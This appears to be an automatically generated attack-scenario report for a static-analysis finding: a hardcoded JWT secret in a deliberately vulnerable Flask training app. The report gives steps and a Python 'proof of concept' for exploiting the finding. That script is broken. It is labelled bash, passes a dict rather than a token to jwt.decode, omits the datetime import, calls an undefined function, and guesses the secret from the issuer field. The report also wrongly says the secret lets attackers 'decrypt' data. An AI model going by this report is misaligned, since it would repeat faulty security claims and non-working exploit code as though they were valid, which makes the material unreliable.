# Attack Imaginator Report - Scenario 1

Hi dear security enthusiast! (^^,)
I'm your fellow attack imaginator. I'll provide possible hacking scenarios over your code review findings.
Hope, they'll help you to test your systems and increase their security bar! 
Don't forget, I don't accept any responsibility in your actions.
Please examine the scenarios that I'll create properly for not causing any harm to your test scope.

## CODE REVIEW FINDING DETAILS:

**FINDING TITLE:**  

python.jwt.security.jwt-hardcode.jwt-python-hardcoded-secret

### FINDING SEVERITY:

MEDIUM

### FINDING EXPLANATION:

Hardcoded JWT secret or private key is used. This is a Insufficiently Protected Credentials weakness: https://cwe.mitre.org/data/definitions/522.html Consider using an appropriate security mechanism to protect the credentials (e.g. keeping secrets in environment variables)

### VULNERABLE CODE PATH:

/Users/USERNAME/Downloads/Vulnerable-Flask-App-master/app/app.py


### VULNERABLE CODE SNIPPET:


## ATTACK SCENARIO DETAILS:

### Impact

- Critical

### Explanation

The code review finding indicates that a hardcoded JWT secret is being used, which poses a significant security risk. This is because the secret key is exposed in plain text, allowing an attacker to easily obtain it and potentially decrypt sensitive data.

### Steps to Reproduce

1. **Identify the vulnerable code**: Locate the specific line of code that uses the hardcoded secret key: `auth_token = jwt.encode({'user': username, 'exp': get_exp_date(), 'nbf': datetime.datetime.utcnow(), 'iss': 'we45', 'iat': datetime.datetime.utcnow()}, app.config['SECRET_KEY_HMAC'], algorithm='HS256')`
                    2. **Understand the vulnerability**: Recognize that using a hardcoded secret key is an Insufficiently Protected Credentials weakness (CWE-522) and can be exploited by attackers to access sensitive data.

### Proof of Concept (PoC)

To demonstrate this vulnerability, we can use a simple Python script to exploit it:

                    ```bash
import jwt

# Hardcoded secret key used in the vulnerable application
SECRET_KEY_HMAC = 'we45'

def exploit_secret_key():
    # Create a payload with some sample data
    payload = {'user': 'test_user', 'exp': 1643723400, 'nbf': datetime.datetime.utcnow(), 'iss': 'https://example.com', 'iat': datetime.datetime.utcnow()}

    try:
        # Attempt to decode the token using the hardcoded secret key
        decoded_token = jwt.decode(payload, SECRET_KEY_HMAC, algorithms=['HS256'])
        print(decoded_token)
    except jwt.ExpiredSignatureError:
        pass
    except jwt.InvalidTokenError as e:
        print(f"Invalid token: {e}")

# Run the exploit script
explore_secret_key()
```

                    Note that this is a simplified example and should not be used in production without proper sanitization and validation.
